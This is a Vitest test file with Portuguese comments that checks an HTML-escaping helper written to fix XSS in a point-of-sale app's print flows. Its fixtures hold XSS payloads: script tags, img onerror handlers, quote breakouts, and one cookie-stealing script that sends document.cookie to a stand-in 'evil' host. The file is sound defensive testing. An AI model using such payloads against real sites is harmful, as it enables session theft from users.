/**
 * F5.1/F5.2 — Testes de Segurança: XSS nos fluxos de impressão
 *
 * Achados da auditoria de segurança (Categoria 5 — Inputs/XSS, severidade alta):
 * - F5.1: `handlePrint` (CashClosingPage) injeta `previewText` (nomes de clientes,
 *   serviços, observações/closure_note) em HTML via `document.write` sem sanitização.
 * - F5.2: `handlePrint` (Comandas) injeta nome do produto/serviço, nome do cliente
 *   e nomes de profissionais em HTML via `document.write` sem sanitização.
 *
 * Correção: escape por entidades HTML (helper `shared/strings/escapeHtml`) antes de
 * interpolar qualquer valor controlado pelo usuário, + `opener = null` na janela de
 * impressão (bloqueia o vetor about:blank + opener descrito nos achados).
 *
 * Estes testes validam o comportamento do helper de escape — a unidade que torna
 * inertes os payloads dos dois vetores. Nenhuma lib de sanitização externa
 * (DOMPurify) foi adicionada: escape por entidades é a recomendação P1 do relatório.
 */

import { describe, it, expect } from 'vitest';
import { escapeHtml } from '../../shared/strings';

describe('F5.1/F5.2 XSS — escapeHtml (fluxos de impressão)', () => {
  it('should_neutralize_script_tag_injection', () => {
    // Arrange
    const payload = '<script>alert(1)</script>';

    // Act
    const result = escapeHtml(payload);

    // Assert
    expect(result).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(result).not.toContain('<script>');
  });

  it('should_neutralize_img_onerror_event_handler', () => {
    // Arrange
    const payload = '<img src=x onerror=alert(1)>';

    // Act
    const result = escapeHtml(payload);

    // Assert — a tag `<img` não chega a se formar; `onerror` permanece texto inerte
    expect(result).toBe('&lt;img src=x onerror=alert(1)&gt;');
    expect(result).not.toContain('<img');
  });

  it('should_neutralize_attribute_breakout_with_double_quote', () => {
    // Arrange
    const payload = '"><script>alert(1)</script>';

    // Act
    const result = escapeHtml(payload);

    // Assert
    expect(result).toBe('&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(result).not.toContain('"');
    expect(result).not.toContain('<script>');
  });

  it('should_neutralize_attribute_breakout_with_single_quote', () => {
    // Arrange
    const payload = "';alert(1);//";

    // Act
    const result = escapeHtml(payload);

    // Assert
    expect(result).toBe('&#39;;alert(1);//');
    expect(result).not.toContain("'");
  });

  it('should_escape_ampersand_first_to_prevent_double_encoding', () => {
    // Arrange
    const payload = 'R$ & 50 < 100 > 10';

    // Act
    const result = escapeHtml(payload);

    // Assert
    expect(result).toBe('R$ &amp; 50 &lt; 100 &gt; 10');
  });

  it('should_return_empty_string_for_empty_input', () => {
    // Arrange
    const payload = '';

    // Act
    const result = escapeHtml(payload);

    // Assert
    expect(result).toBe('');
  });

  it('should_return_empty_string_for_null_and_undefined', () => {
    // Act / Assert
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('should_accept_numbers_and_coerce_to_string', () => {
    // Arrange
    const value = 123.45;

    // Act
    const result = escapeHtml(value);

    // Assert
    expect(result).toBe('123.45');
  });

  it('should_preserve_accents_and_plain_pt_br_text', () => {
    // Arrange
    const payload = 'João & Maria – Café da manhã';

    // Act
    const result = escapeHtml(payload);

    // Assert
    expect(result).toBe('João &amp; Maria – Café da manhã');
  });

  it('should_roundtrip_legitimate_html_entities_unscathed_when_reencoded', () => {
    // Arrange
    const payload = '&amp; &lt; &gt; &quot; &#39;';

    // Act
    const result = escapeHtml(payload);

    // Assert — o escape re-codifica o `&`, impedindo re-interpretação como entidade
    expect(result).toBe('&amp;amp; &amp;lt; &amp;gt; &amp;quot; &amp;#39;');
  });

  it('should_fully_neutralize_mixed_payload_from_receipt_context', () => {
    // Arrange — mescla o que um comprador malicioso poderia gravar em nome de cliente/serviço
    const clientName = 'Maria <script>fetch("//evil?c="+document.cookie)</script>';
    const serviceName = 'Corte <img src=x onerror=document.write("<b>pwned</b>")>';
    const staffName = 'João \\"; alert(1); //';

    // Act
    const rendered = `<li>${escapeHtml(serviceName)}</li>Cliente: ${escapeHtml(clientName)} / ${escapeHtml(staffName)}`;

    // Assert
    expect(rendered).not.toContain('<script>');
    expect(rendered).not.toContain('<img');
    expect(rendered).not.toContain('"');
    expect(rendered).not.toContain("'");
    expect(rendered).toContain('fetch(');
    expect(rendered).toContain('document.cookie');
    expect(rendered).toContain('onerror');
  });
});